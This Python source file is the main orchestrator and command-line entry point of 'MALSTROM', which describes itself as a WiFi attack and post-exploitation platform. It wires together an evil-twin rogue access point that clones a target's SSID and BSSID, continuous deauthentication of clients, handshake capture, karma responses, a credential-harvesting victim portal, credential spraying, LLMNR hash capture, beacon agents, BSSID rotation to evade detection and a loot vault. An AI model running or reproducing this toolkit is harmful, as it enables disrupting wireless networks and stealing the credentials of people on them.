"""MALSTROM Linux app: orchestrator, engine loop, CLI.

Wires state, the rogue-AP stack, deauth, monitor, victim portal and operator
dashboard into one process. Run as root:

    sudo ./bin/malstrom

Then open the printed dashboard URL and authenticate with the printed token.
"""

import argparse
import os
import signal
import sys
import threading
import time
import webbrowser

from . import config
from . import beacon
from . import capture
from . import deauth
from . import karma
from . import lateral
from . import linuxutil
from . import mitm
from . import monitor
from . import notify
from . import portal
from . import scan
from . import services
from . import state
from . import autopwn
from . import verify
from . import web
from . import __version__

BANNER = r"""
 __  __     _     _       ____    _____   ____    ____    __  __
|  \/  |   / \   | |     / ___|  |_   _| |  _ \  |    |  |  \/  |
| |\/| |  / _ \  | |     \___ \    | |   | |_) | | /\ |  | |\/| |
| |  | | / ___ \ | |___   ___) |   | |   |  _ <  |/  \|  | |  | |
|_|  |_|/_/   \_||_____| |____/    |_|   |_| \_\ |____|  |_|  |_|
      DarkSec MALSTROM 1.2.5 — WiFi attack & post-exploitation platform
"""


def _clone_sig(st):
    return (st.get('target_ssid'), st.get('target_bssid'),
            st.get('target_channel'), st.get('portal_mode'), st.get('wpa_psk'),
            st.get('portal_ssid'), st.get('clone_bssid'),
            st.get('wpa3_transition'), st.get('ssid_cloak'))


class Malstrom(object):
    def __init__(self, check_only=False):
        self.stack = services.RogueStack()
        self.deauth = deauth.DeauthEngine()
        self.monitor = monitor.Monitor()
        self.capture = capture.CaptureEngine()
        self.verify = verify.VerifyEngine()
        self.karma = karma.KarmaEngine()
        self.autopwn = autopwn.AutopwnEngine(self)
        self.scan = scan.ScanEngine()
        self.lateral = lateral.LateralEngine()
        self.mitm = mitm.MitmEngine()
        self.beacon = beacon.BeaconEngine()
        self.engine_stop = threading.Event()
        self.engine_thread = None
        self.dash_server = None
        self.dash_thread = None
        self.portal_thread = None
        self._stack_up = False
        self._armed = False
        self._cfg_sig = None
        self._stack_retry_at = 0.0
        self._alive_at = 0.0
        self._last_rotate_at = 0.0
        self._rotate_warned = False
        state.ensure()

    # --- readiness report -------------------------------------------------------
    def checks(self):
        lines = []
        lines.append('state dir : %s' % config.STATE_DIR)
        lines.append('loot dir  : %s' % config.LOOT_DIR)
        lines.append('portal    : %s:%d  dns :%d' % (
            config.PORTAL_IP, config.PORTAL_PORT, config.DNS_PORT))
        need = {
            'hostapd': 'rogue AP',
            'dnsmasq': 'dhcp + rogue dns',
            'iw': 'wireless control',
        }
        # iptables is preferred but nft covers the redirect/isolation layer on
        # distros that only ship `nft` — report the pair honestly as one line.
        fw = linuxutil.fw_backend()
        if fw:
            lines.append('firewall  OK (backend: %s — traffic redirect, '
                         'isolation %s)' % (fw, 'on' if config.CLIENT_ISOLATION
                                            else 'off'))
        else:
            lines.append('firewall  MISSING — arming refused until iptables or nft is installed')
        lines.append('iptables  %s (redirect; nft is used when absent)' % (
            'OK' if linuxutil.have('iptables') else 'absent'))
        for tool, role in need.items():
            lines.append('%-10s %-16s %s' % (tool,
                                             'OK' if linuxutil.have(tool) else 'MISSING',
                                             role))
        if linuxutil.have('aireplay-ng'):
            lines.append('aireplay-ng OK (deauth injection, raw 802.11 fallback)')
        lines.append('capture    %s' % ('tcpdump' if linuxutil.have('tcpdump') else
                                        'no tcpdump — EAPOL detection only (no pcap)'))
        lines.append('verify     %s (aircrack-ng handshake/PMKID validity)' % (
            'aircrack-ng' if linuxutil.have('aircrack-ng') else 'MISSING'))
        lines.append('karma      OK (passive probe listen%s)' % (
            ' + opt-in auto-respond' if config.KARMA_RESPOND else ', no auto-respond'))
        lines.append('scan       %s' % ('nmap' if linuxutil.have('nmap') else 'MISSING (host + port discovery)'))
        lines.append('lateral    %s (cred spray; requires captured creds)' % (
            linuxutil.have('netexec') and 'netexec' or 'MISSING'))
        lines.append('mitm       %s (LLMNR/mDNS/NBT-NS hash catch)' % (
            linuxutil.have('responder') and 'responder' or 'MISSING'))
        lines.append('beacon     payloads ready (sh + ps1 agents, key-%s)' % (
            state.get_beacon_key()[:6]))
        for dev in linuxutil.scan_phys():
            tag = ''
            if linuxutil.phy_banned(dev['phy']):
                tag = '  BLOCKED (%s wedges this system on vif create — opt in via MALSTROM_MON_IFACE/AP_IFACE)' % (
                    linuxutil.phy_driver(dev['phy']))
            lines.append('phy %-16s iface %s%s' % (dev['phy'], dev['iface'], tag))
        dev = linuxutil.preferred_wlan_dev()
        if dev:
            if not linuxutil.netdev_exists(dev):
                lines.append('attack radio %s: NOT PRESENT — auto-planning used' % dev)
            elif 'AP' not in linuxutil.phy_modes(linuxutil.phy_of(dev)):
                lines.append('attack radio %s: cannot serve an AP (managed+monitor '
                             'only) — pick an AP-capable card' % dev)
        ap_iface, created = linuxutil.plan_ap_iface()
        lines.append('AP interface plan: %s%s' % (
            ap_iface, ' (create on arm)' if created else ''))
        mon = linuxutil.plan_monitor_iface()
        lines.append('monitor interface: %s' % (mon or 'unavailable'))
        return '\n'.join(lines)

    # --- http helpers ---------------------------------------------------------------
    def sysinfo(self):
        mon = None
        if linuxutil.netdev_exists(config.MON_VIF_NAME) or config.MON_IFACE:
            mon = linuxutil.plan_monitor_iface()
        return {
            'alive': self.engine_thread is not None and self.engine_thread.is_alive(),
            'version': __version__,
            'host': linuxutil.default_route_iface() or '-',
            'ap_iface': self.stack.ap_iface or linuxutil.plan_ap_iface()[0] or '-',
            'mon_iface': mon or '-',
            'method': config.DEAUTH_METHOD,
            'portal_ip': config.PORTAL_IP,
            'portal_net': config.PORTAL_NET,
            'beacon': 1 if self.beacon.enabled() else 0,
            'platform': sys.platform,
        }

    # --- rogue stack ---------------------------------------------------------------
    def _bring_up_stack(self):
        if self._stack_up:
            return
        self.stack.prepare_iface()
        # Pre-create the monitor vif BEFORE hostapd goes critical. Creating a
        # virtual interface on a USB wifi card while the AP is already serving
        # triggers a udev/driver storm that can wedge the whole radio stack (a
        # Pi hangs entirely) — seen in the field as a frozen system ~2min after
        # arming. Doing it here, ahead of the AP, moves that risk out of the
        # engagement window and lets udev settle before anything is live.
        mon = linuxutil.ensure_monitor_iface()
        if mon:
            state.emit('INFO', 'monitor vif %s ready before AP start' % mon)
            time.sleep(1.0)
        else:
            state.emit('INFO', 'no free radio for monitor vif — '
                               'deauth/capture degrade to none')
        if not self.stack.ap_iface \
                or not linuxutil.netdev_exists(self.stack.ap_iface):
            sac = ', '.join(linuxutil.ap_capable_uplinks())
            blocked = ', '.join(linuxutil.banned_ifaces())
            hint = ('Sacrifice an uplink: set MALSTROM_AP_IFACE=%s (drops that '
                    'link during the attack).' % sac) if sac else \
                   ('Plug in an AP-capable wifi card (your "spare" only does '
                    'managed+monitor).')
            if blocked:
                hint += (' BLACKLISTED drivers, untouched: %s — they wedge this '
                         'system on vif create; explicit MALSTROM_AP_IFACE opts in.'
                         % blocked)
            state.emit('ALERT',
                       'rogue-AP stack unavailable: no spare radio that supports '
                       'AP mode. %s Your internet uplink was NOT touched.'
                       % hint)
            self._stack_up = False
            return
        linuxutil.nm_managed(self.stack.ap_iface, False)
        if not self.stack.setup_firewall():
            state.emit('ALERT', 'aborting rogue-AP bring-up: firewall backend '
                       'unavailable (install iptables or nftables)')
            self._stack_up = False
            return
        self.stack._set_portal_addr()
        self.stack.start_dns()
        self._stack_up = True

    def _clone(self, st):
        self._bring_up_stack()
        return self.stack.start_hostapd(st)

    def _retry_stack(self, st):
        """Keep standing the rogue AP up while armed.

        A spare radio can appear after the chain is armed (hotplugged USB card
        or a driver still enumerating when the first arm attempt ran). Without
        this, the kill chain would stay "armed" doing deauth against a phantom
        AP and never serve the portal. Retry cheaply and only alert on a timer
        so the event log doesn't flood, and back off between attempts — the
        rtl88xxau AP cards take seconds per interface transition and hammering
        them stacks failing transitions until the radio stack wedges.
        """
        now = time.time()
        # hard throttle: nothing re-attempts more often than RETRY_UP when a
        # stack exists, or RETRY_DOWN when nothing is up at all. This replaces
        # the old every-2s bring-up attempt that fought the radio on a bad box.
        if now - self._stack_retry_at < (
                config.STACK_RETRY_UP if self._stack_up else config.STACK_RETRY_DOWN):
            return
        self._stack_retry_at = now
        if self._stack_up:
            if self._hostapd_alive():
                return
            try:
                ok = self._clone(st)
            except Exception as exc:
                state.emit('ALERT', 'AP restart exception: %s' % exc)
                return
            if ok:
                state.emit('INFO', 'hostapd restarted on retry (%s)'
                           % self.stack.ap_iface)
                self._resume_deauth_if_needed(st)
            return
        try:
            ok = self._clone(st)
        except Exception as exc:
            state.emit('ALERT', 'AP retry exception: %s' % exc)
            return
        if ok:
            state.emit('INFO', 'rogue AP up on retry (%s)' % self.stack.ap_iface)
            self._resume_deauth_if_needed(st)
            return
        sac = ', '.join(linuxutil.ap_capable_uplinks())
        hint = ('Set MALSTROM_AP_IFACE=%s to sacrifice that uplink, or '
                'plug in an AP-capable wifi card.' % sac) if sac else \
               ('Plug in a wifi card that supports AP mode (managed+monitor '
                'only is not enough).')
        state.emit('ALERT',
                   'rogue AP still down — no AP-capable radio available. %s'
                   % hint)

    def _maybe_rotate(self, st):
        """Periodically swap the decoy BSSID while armed (beacon evasion).

        Rotation is decoy-mode only: cloning the target's exact BSSID already
        IS the identity, so rotating it would unmask the twin. Called on the
        engine cadence when the stack is up and hostapd is demonstrably alive
        (never rotate a half-dead AP).
        """
        try:
            mins = int(st.get('beacon_rotate') or 0)
        except (TypeError, ValueError):
            mins = 0
        if mins <= 0:
            return
        if st.get('clone_bssid'):
            if not self._rotate_warned:
                self._rotate_warned = True
                state.emit('INFO', 'identity rotation configured but skipped — '
                                   'BSSID is CLONED, rotation is decoy-mode only')
            return
        if time.time() - self._last_rotate_at < mins * 60:
            return
        try:
            fresh = self.stack.rotate_identity(st)
        except Exception as exc:
            state.emit('ALERT', 'identity rotation failed: %s' % exc)
            return
        if fresh:
            self._last_rotate_at = time.time()
            state.emit('INFO', 'identity rotated: rogue BSSID now %s%s' % (
                fresh, ' — SSID cloaked' if st.get('ssid_cloak') else ''))

    def _resume_deauth_if_needed(self, st):
        """Restart the deauth loop after a successful AP (re)start, if it died.

        A failed arm stops deauth (hostapd was down, nothing to deauth around);
        when a later retry finally brings the AP up we must resume it or the
        chain stays armed but silent.
        """
        if not self._armed:
            return
        if getattr(self.deauth, '_thread', None):
            return
        if getattr(self.deauth, '_cfg', None) is None:
            return
        try:
            self.deauth.start(st)
            state.emit('INFO', 'deauth resumed after AP came back up')
        except Exception as exc:
            state.emit('ALERT', 'deauth resume failed: %s' % exc)

    def _hostapd_alive(self):
        """Real hostapd liveness.

        The Popen handle the stack owns is the source of truth — hostapd v2.10
        (Kali) never writes its -P pidfile in foreground mode, so the old
        pidfile check declared every healthy AP dead and the retry loop
        kill-relaunched a working rogue AP forever. While the handle is young
        the radio may still be flipping into AP mode (USB cards take several
        seconds), so only enforce the AP-mode check after a grace window; the
        pidfile path remains only for a hostapd we don't own a handle to.
        Probes are throttled to STACK_ALIVE_INTERVAL so the `iw` calls don't
        hammer a slow USB card between retries.
        """
        now = time.time()
        if now - self._alive_at < config.STACK_ALIVE_INTERVAL:
            return True
        self._alive_at = now
        try:
            proc = self.stack.hostapd
            if proc is not None:
                if proc.poll() is not None:
                    # the process handle we own has exited — AP is definitively down
                    return False
                if now - getattr(self.stack, 'hostapd_started', 0.0) < \
                        config.AP_TRANSITION_GRACE:
                    return True         # slow radio still flipping to AP mode
                if self.stack.ap_iface and \
                        linuxutil.netdev_exists(self.stack.ap_iface):
                    return linuxutil.iface_mode(self.stack.ap_iface) == 'AP'
                return True
            # No owned handle (e.g. a leftover from a previous daemon):
            # optional pidfile probe — this only ever sees foreign processes.
            with open(state.HOSTAPD_PID) as fh:
                pid = int(fh.read().strip())
            with open('/proc/%d/comm' % pid) as fh:
                if not fh.read().strip().startswith('hostapd'):
                    return False
            if self.stack.ap_iface and linuxutil.netdev_exists(self.stack.ap_iface):
                if linuxutil.iface_mode(self.stack.ap_iface) != 'AP':
                    return False
            os.kill(pid, 0)
            return True
        except (IOError, ValueError, ProcessLookupError):
            return False

    def _rogue_mac(self):
        if self.stack.ap_iface:
            return linuxutil.iface_mac(self.stack.ap_iface)
        return ''

    # --- engine --------------------------------------------------------------------
    def _engine_loop(self):
        state.emit('INFO', 'MALSTROM engine online (pid %d)' % os.getpid())
        while not self.engine_stop.is_set():
            try:
                st = state.load_state()
                was = self._armed
                now = bool(st.get('active'))
                sig = _clone_sig(st)
                if now and not was:
                    self._armed = True
                    self._cfg_sig = sig
                    self._last_rotate_at = 0.0
                    self._rotate_warned = False
                    # force the cfg block below to (re)start deauth exactly once
                    self.deauth._cfg = None
                    dropped = state.clear_whitelist_ips()
                    if dropped:
                        state.emit('INFO',
                                   'fresh engagement: dropped %d stale client '
                                   'IP shields — portal served to everyone '
                                   'again' % dropped)
                    ok = self._clone(st)
                    self.deauth.set_rogue(self.stack.ap_iface,
                                          st.get('target_channel'))
                    state.emit('DEP', 'kill chain armed: %s (%s) ch%s [%s deauth]%s' % (
                        st.get('target_ssid', '?'), st.get('target_bssid', '?'),
                        st.get('target_channel', '?'), st.get('deauth_mode', '?'),
                        '' if ok else ' — rogue AP DOWN, engine retries (deauth paused)'))
                    if not ok:
                        self.deauth.stop()
                        state.emit('ALERT', 'hostapd could not bring the rogue AP up')
                elif was and not now:
                    self._armed = False
                    self.deauth.stop()
                    self._cfg_sig = None
                    torn = False
                    try:
                        if self._stack_up:
                            self.stack.cleanup()
                            self._stack_up = False
                            torn = True
                    except Exception as exc:
                        state.emit('ALERT', 'stack teardown error: %s' % exc)
                    state.emit('DEP', 'kill chain disarmed (idle)%s' % (
                        ' — rogue AP down, original wifi restored' if torn
                        else ''))

                if now and sig != self._cfg_sig:
                    self._cfg_sig = sig
                    ok = self._clone(st)
                    if not ok and self._armed:
                        self.deauth.stop()
                if now:
                    cfg = (st.get('target_bssid'), st.get('target_channel'),
                           st.get('deauth_mode'), st.get('deauth_burst'),
                           st.get('deauth_delay'), st.get('deauth_continuous'))
                    self.deauth.set_rogue(self.stack.ap_iface,
                                          st.get('target_channel'))
                    if getattr(self.deauth, '_cfg', None) != cfg:
                        self.deauth.stop()
                        self.deauth._cfg = cfg
                        if self._stack_up:
                            self.deauth.start(st)
                    self._retry_stack(st)
                    if self._stack_up and self._hostapd_alive() \
                            and not st.get('clone_bssid'):
                        self._maybe_rotate(st)

                self.monitor.cycle()
                self.capture.set_cmd(
                    active=now and bool(st.get('active')),
                    bssid=st.get('target_bssid', ''),
                    ssid=st.get('target_ssid', ''),
                    channel=st.get('target_channel', ''),
                    mode=st.get('capture_mode', 'off'),
                    rogue_bssid=self._rogue_mac())
                self.karma.set_cmd(
                    # karma is the always-on ear when enabled: idle it hops the
                    # full band (scan-channel awareness), armed it pins to the
                    # target channel that deauth/capture own.
                    active=bool(st.get('karma', True)),
                    ssid=st.get('portal_ssid') or st.get('target_ssid', ''),
                    bssid=self._rogue_mac(),
                    channel=st.get('target_channel', ''),
                    mode=st.get('portal_mode', 'open'),
                    hop=bool(st.get('karma', True)) and config.KARMA_HOP
                    and not now,
                    respond=now and bool(st.get('karma', True))
                    and self._stack_up
                    and bool(st.get('karma_respond', config.KARMA_RESPOND)))
                if self._stack_up:
                    self.stack.sync_whitelist(set(state.read_whitelist()))
            except Exception as exc:  # keep the daemon alive
                state.emit('ALERT', 'engine exception: %s' % exc)
            self.engine_stop.wait(config.POLL)

    def start(self):
        state.ensure()
        state.clear_sessions()
        if not state.get_token():
            if config.TOKEN:
                state.set_token(config.TOKEN)
            else:
                state.set_token(os.urandom(8).hex())
        with open(state.EVENTS_FILE, 'w'):
            pass
        with open(config.DHCP_LEASE_FILE, 'w'):
            pass
        state.mirror_loot()

        app_mode = state.app_mode_enabled()
        if app_mode:
            # Desktop-launcher mode: start clean and idle so a stale armed
            # state can't silently bring a phantom AP + deauth up again.
            st = state.load_state()
            if st.get('active'):
                st['active'] = False
                state.write_state(st)
                state.emit('INFO', 'app mode: starting idle (previous '
                                   'engagement was disarmed)')
            n = state.clear_whitelist_ips()
            if n:
                state.emit('INFO', 'app mode: cleared %d stale client IP '
                                   'shields' % n)

        self.engine_thread = threading.Thread(target=self._engine_loop, daemon=True)
        self.engine_thread.start()
        self.capture.start()
        self.capture.set_verifier(self.verify)
        self.verify.start()
        self.karma.start()
        self.autopwn.start()

        self.portal_thread = portal.start(self.beacon)

        self.dash_server, self.dash_thread = web.serve(self)
        state.emit('INFO', 'MALSTROM ready — dashboard on :%d' % config.DASH_PORT)
        if app_mode:
            self._start_idle_watchdog()

    def chain_cleanup(self):
        """Tear down the active kill chain but keep the daemon + engine loop
        running so the operator can re-arm from the dashboard."""
        try:
            self.deauth.stop()
        except Exception:
            pass
        try:
            self.mitm.stop()
        except Exception:
            pass
        st = state.load_state()
        st['active'] = False
        st['auto_armed'] = False
        state.write_state(st)
        self._armed = False
        try:
            if self._stack_up:
                self.stack.cleanup()
                self._stack_up = False
        except Exception as exc:
            state.emit('ALERT', 'cleanup error: %s' % exc)
        try:
            linuxutil.cleanup_created_vifs()
        except Exception:
            pass
        state.emit('CLEANUP', 'MALSTROM chain torn down — original wifi restored')
        state.mirror_loot()

    def cleanup(self):
        self.engine_stop.set()
        try:
            self.deauth.stop()
        except Exception:
            pass
        try:
            self.capture.stop()
        except Exception:
            pass
        try:
            self.verify.stop()
        except Exception:
            pass
        try:
            self.karma.stop()
        except Exception:
            pass
        try:
            self.autopwn.stop()
        except Exception:
            pass
        try:
            self.mitm.stop()
        except Exception:
            pass
        self._armed = False
        try:
            if self._stack_up:
                self.stack.cleanup()
                self._stack_up = False
        except Exception as exc:
            state.emit('ALERT', 'cleanup error: %s' % exc)
        try:
            linuxutil.cleanup_created_vifs()
        except Exception:
            pass
        if self.engine_thread and self.engine_thread.is_alive():
            self.engine_thread.join(timeout=3)
        # The desktop-launcher flag belongs to THIS daemon process. Leaving it
        # behind on a systemctl stop/restart made every later boot think it
        # was a desktop session again: armed engagements were force-disarmed
        # at startup and the daemon self-exited once the dashboard idled.
        state.set_app_mode(False)
        state.emit('CLEANUP', 'MALSTROM torn down')
        state.mirror_loot()

    # --- app-mode lifecycle ----------------------------------------------------
    def _start_idle_watchdog(self):
        """In desktop-launcher mode, stop everything once the dashboard goes away.

        The dashboard keeps an SSE stream open for as long as its tab is open;
        the second that stream (and every heartbeat) drops, the daemon
        tear-s itself down completely (AP, dnsmasq, firewall, threads) and
        exits — so closing the app-icon window stops MALSTROM for real.
        """
        t = threading.Thread(target=self._idle_watch, name='app-idle-watch',
                             daemon=True)
        t.start()

    def _idle_watch(self):
        last = time.time()
        while not self.engine_stop.is_set():
            time.sleep(2)
            # re-read each loop: start() may still be wiring dash_server up, or
            # web.bind may have failed and left it None — never wedge on a stale
            # capture (the old code grabbed it once and then looped forever when
            # the dashboard never came up, hanging the shutdown path).
            server = self.dash_server
            if server is None:
                # no dashboard (or not up yet) — count from app start
                idle_since = last
            else:
                stats = server.presence_stats()
                if stats['clients'] > 0:
                    last = time.time()
                    continue
                idle_since = max(last, stats['last_seen'])
            if time.time() - idle_since > config.APP_IDLE:
                break
        if self.engine_stop.is_set():
            return
        state.emit('INFO', 'dashboard closed — MALSTROM stopping (app mode) '
                           '(everything torn down)')
        st = state.load_state()
        if st.get('active'):
            st['active'] = False
            state.write_state(st)
        try:
            self.cleanup()
        except Exception as exc:
            state.emit('CLEANUP', 'app-mode shutdown error: %s' % exc)
        state.set_app_mode(False)
        os._exit(0)


def main(argv=None):
    parser = argparse.ArgumentParser(
        prog='malstrom', description='DarkSec MALSTROM — WiFi attack & post-exploitation platform for Linux')
    parser.add_argument('--port', type=int, default=config.DASH_PORT,
                        help='dashboard port (default %d)' % config.DASH_PORT)
    parser.add_argument('--no-auth', action='store_true',
                        help='disable the token gate on the local dashboard')
    parser.add_argument('--token', default=None,
                        help='access token (default: random, printed at boot)')
    parser.add_argument('--open', action='store_true',
                        help='open the dashboard in the default browser')
    parser.add_argument('--check', action='store_true',
                        help='report system readiness and exit')
    parser.add_argument('--wipe-loot', action='store_true',
                        help='wipe the loot vault + data stores and exit')
    parser.add_argument('--wipe-whitelist', action='store_true',
                        help='un-shield every client (portal served to all again) and exit')
    parser.add_argument('--reset', action='store_true',
                        help='factory reset (loot, state, settings, auth) and exit')
    parser.add_argument('--web-only', action='store_true',
                        help='start only the dashboard (no root, no radio)')
    args = parser.parse_args(argv)

    if args.port:
        config.DASH_PORT = args.port
    if args.no_auth:
        config.AUTH_REQUIRED = False
    if args.token:
        config.TOKEN = args.token

    # The default install has the auth gate OFF; never leave an
    # unauthenticated dashboard reachable from the LAN. No TLS + no auth on a
    # public bind would hand the token gate (and every loot-served API call)
    # to anyone on the segment — force loopback even if the operator set
    # DASH_HOST=0.0.0.0 (an authenticated operator can flip the gate ON in
    # Settings and the daemon then keeps the public bind).
    if not config.AUTH_REQUIRED and config.DASH_HOST != '127.0.0.1':
        state.emit('ALERT', 'dashboard auth gate off — forced loopback bind '
                            '(set MALSTROM_AUTH=1 to expose on the LAN)')
        config.DASH_HOST = '127.0.0.1'

    app = Malstrom()
    state.harden_state()
    state.add_alert_hook(notify.notify)
    if config.VAULT:
        from . import vault
        if not vault.available():
            state.emit('ALERT', 'MALSTROM_VAULT=1 but python3-cryptography is '
                                'missing — mirrored loot stays plaintext')

    if args.wipe_whitelist:
        n = len(state.read_whitelist())
        state.clear_whitelist()
        print('MALSTROM whitelist cleared (%d shielded entries removed). The '
              'engine drops the stale firewall bypasses on its next cycle.'
              % n)
        return 0

    if args.wipe_loot or args.reset:
        if args.reset:
            state.reset_all(preserve_auth=False)
            print('MALSTROM factory reset complete (loot, state, settings, auth wiped).')
        else:
            state.clear_loot()
            state.reset_stores()
            print('MALSTROM loot vault cleared.')
        return 0

    if args.check:
        print(BANNER)
        print(app.checks())
        return 0

    if not args.web_only and os.geteuid() != 0:
        print('error: MALSTROM must run as root for radio + firewall access.')
        print('       Try: sudo %s' % os.path.abspath(sys.argv[0]))
        return 1

    print(BANNER)
    if args.web_only:
        print('web-only mode — dashboard only, nothing touches the radio')
        state.ensure()
        if not state.get_token():
            if config.TOKEN:
                state.set_token(config.TOKEN)
            else:
                state.set_token(os.urandom(8).hex())
        app.dash_server, app.dash_thread = web.serve(app)
        token = state.get_token() or config.TOKEN or ''
        scheme = 'https' if config.DASH_TLS else 'http'
        print('  dashboard : %s://127.0.0.1:%d' % (scheme, config.DASH_PORT))
        if config.DASH_TLS:
            print('  tls       : self-signed cert (browser will warn once)')
        if not config.AUTH_REQUIRED:
            print('  no-auth   : token gate disabled (bound to localhost only)')
        print('  password  : %s' % token)
        try:
            while True:
                time.sleep(3600)
        except KeyboardInterrupt:
            notify.stop()
            return 0

    done = {'run': False}

    def _stop(sig, frame):
        if done['run']:
            return
        done['run'] = True
        print('\nshutting down...')
        try:
            notify.stop()
            app.cleanup()
        finally:
            sys.exit(0)

    # SIGTERM (systemctl stop) and SIGHUP (legacy management tools) both mean a
    # full graceful teardown — every radio/firewall step must complete, which
    # is why the systemd unit uses SendSIGKILL=no (see deploy/malstrom.service).
    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)
    signal.signal(signal.SIGHUP, _stop)

    app.start()
    token = state.get_token() or ''
    scheme = 'https' if config.DASH_TLS else 'http'
    print('  dashboard : %s://127.0.0.1:%d' % (scheme, config.DASH_PORT))
    if config.DASH_TLS:
        print('  tls       : self-signed cert (browser will warn once)')
    if not config.AUTH_REQUIRED:
        print('  no-auth   : token gate disabled (bound to localhost only)')
    print('  password  : %s' % token)
    print('  loot      : %s' % config.LOOT_DIR)
    print('  ctrl-c to stop and restore everything')
    if args.open:
        webbrowser.open('%s://127.0.0.1:%d' % (scheme, config.DASH_PORT))

    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        pass
    finally:
        if not done['run']:
            done['run'] = True
            notify.stop()
            app.cleanup()
    return 0
